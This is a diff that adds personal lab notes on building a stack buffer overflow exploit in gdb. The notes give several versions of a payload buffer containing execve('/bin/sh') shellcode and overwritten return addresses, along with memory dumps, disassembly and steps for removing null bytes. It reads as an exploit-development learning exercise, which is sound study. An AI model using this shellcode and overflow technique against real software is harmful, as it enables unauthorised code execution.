@@ -625,6 +625,119 @@ End of assembler dump.
 0xbffff37c:     0xbffff374
 0xbffff380:     0x00000000
 
+So, I don't know how to recreate the buffer with escape codes other than this weird method.
+Here goes. Do a p or p/s s is default.  It will print readable ascii and then for non
+printable ascii it will print in octal. Print the buffer, copy it to a text editor
+and then add a new line everywhere you see a \.  Then replace the octal sequence with a hex.
+So, \273 is replaced with \xBB.
+
+You can either look up the octal or use p\x as well.  ie. p\s buf copy and paste, manually seperate
+p\x buf and replace in editor.  Its helpful to use vim with column mode edits.
+
+Some recognizable octal to decimal is 
+0377 is ff 
+0277 is bf
+0177 is 7f
+
+Even then its error prone, so you will need to double check with x/1w address
+
+The end result is:
+----------------------
+771509060\x00\x00\x00AAAABBBBCCCCDDDDEEEE\xbb\x74\xf3\xff\xbf\xb9\x7c\xf3\xff\xbf\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\x0b\xcd\x80AAAAAAAABB\x50\xf3\xff\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x74\xf3\xff\xbf\x00\x00\x00\x00
+
+(gdb) x/22xw buf
+0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
+0xbffff340:     0x42424242      0x43434343      0x44444444      0x45454545
+0xbffff350:     0xfff374bb      0xf37cb9ff      0xc031ffff      0xc083c289
+0xbffff360:     0x0b80cd0b      0x414180cd      0x41414141      0x42424141
+0xbffff370:     0xbffff350      0x6e69622f      0x0068732f      0xbffff374
+0xbffff380:     0x00000000      0x0000000a
+
+
+(gdb) disas 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff374,%ebx
+   0xbffff355:  mov    $0xbffff37c,%ecx
+   0xbffff35a:  xor    %eax,%eax
+   0xbffff35c:  mov    %eax,%edx
+   0xbffff35e:  add    $0xb,%eax
+   0xbffff361:  int    $0x80
+   0xbffff363:  or     %ebp,%ecx
+   0xbffff365:  addb   $0x41,0x41(%ecx)
+End of assembler dump.
+
+
+Now, we still have a problem.  The nulls in the buffer are moved to the end, but if
+we are doing a string read only the first byte of the null pointer would be read
+and put on the stack.  We need a full 4 bytes of zero to make a null pointer, so
+we need one more tweak.
+
+
+so using the last string and our patch4.gdb it still executes a shell.  Here is the new buffer.
+
+
+
+771509060\x00\x00\x00AAAA\xb8\x80\xf3\xff\xbf\x31\xdb\x89\x18\x90\x90\x90\x90\x90\x90\x90\xbb\x74\xf3\xff\xbf\xb9\x7c\xf3\xff\xbf\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\x0b\xcd\x80AAAAAAAABB\x40\xf3\xff\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x74\xf3\xff\xbf\x00
+
+It still works, but we have a null byte for the terminating string of /bin/sh.
+
+<using patch5.gdb and testya2.asm - second part>
+<using stepi and layout next to see assembly. print regs and dumping memory>
+
+
+When using nasm it does not use mov.b or movb to change data width.  It uses the register
+name to determine the data width. In this case use bl to use just a byte of the ebx register.
+
+ASIDE: 
+ebx 32 bits - Full 32 bits of the ebx register.
+bx  16 bits - lower 16-bits of ebx register.  Don't think you can specify upper.
+bl  8 bits - bl is lower byte, bh is upper byte
+
+Once again here is the new buffer.  (I've lost the markers BBBB, etc.  They are replaced with 0x90.
+Copy the line, split at these locations, replace bytes manually.
+
+
+771509060\x00\x00\x00AAAA\xb8\x80\xf3\xff\xbf\x31\xdb\x89\x18\x83\xe8\x05\x88\x18\x90\x90\xbb\x74\xf3\xff\xbf\xb9\x7c\xf3\xff\xbf\x31\xc0\x89\xc2\x83\xc0\x0b\xcd\x80\x0b\xcd\x80AAAAAAAABB\x40\xf3\xff\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x33\x74\xf3\xff\xbf\x00
+
+
+So, now we have a payload which does not have any nulls, but it uses absolute addresses.
+
+
+Prior to executing tmp()
+
+(gdb) x/22xw buf
+0xbffff330:     0x35313737      0x36303930      0x00000030      0x41414141
+0xbffff340:     0xfff380b8      0x89db31bf      0x05e88318      0x90901888
+0xbffff350:     0xfff374bb      0xf37cb9bf      0xc031bfff      0xc083c289
+0xbffff360:     0x0b80cd0b      0x414180cd      0x41414141      0x42424141
+0xbffff370:     0xbffff340      0x6e69622f      0x3368732f      0xbffff374
+0xbffff380:     0x00000a00      0x00000000
+
+
+(gdb) disas 0xbffff340, +34
+Dump of assembler code from 0xbffff340 to 0xbffff362:
+   0xbffff340:  mov    $0xbffff380,%eax  <- We want to replace abs address with relative address
+   0xbffff345:  xor    %ebx,%ebx
+   0xbffff347:  mov    %ebx,(%eax)
+   0xbffff349:  sub    $0x5,%eax
+   0xbffff34c:  mov    %bl,(%eax)
+   0xbffff34e:  nop
+   0xbffff34f:  nop
+   0xbffff350:  mov    $0xbffff374,%ebx <- and this
+   0xbffff355:  mov    $0xbffff37c,%ecx <- and this
+   0xbffff35a:  xor    %eax,%eax
+   0xbffff35c:  mov    %eax,%edx
+   0xbffff35e:  add    $0xb,%eax
+   0xbffff361:  int    $0x80
+End of assembler dump.
+(gdb) 
+
+
+Step 6
+
+Modify the code so it does not use absolute addresses.
+
+
 
 
 
